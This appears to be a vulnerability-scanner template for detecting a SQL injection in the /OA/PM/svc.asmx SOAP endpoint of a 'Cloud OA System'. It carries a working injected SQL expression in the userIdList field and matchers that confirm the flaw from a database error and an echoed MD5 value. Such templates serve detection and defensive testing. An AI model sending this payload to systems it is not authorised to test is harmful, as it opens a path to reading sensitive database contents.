id: cloud-oa-system-sqli
brief:
    title: Cloud OA System - SQL Injection
    by: SleepingBag945
    level: high
    about: cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
    label:
        - cloud
        - cloudoa
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/OA/PM/svc.asmx'
      head:
        Content-Type: text/xml
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUsersInfo xmlns="http://tempuri.org/">
              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
            </GetUsersInfo>
          </soap:Body>
        </soap:Envelope>
      signs:
        - "on": word
          has:
            - System.Data.SqlClient.SqlException
            - '{{md5(num)}}'
          in: body
          need: all
        - "on": word
          has:
            - text/xml
          in: header
          need: all
        - "on": status
          status:
            - 500
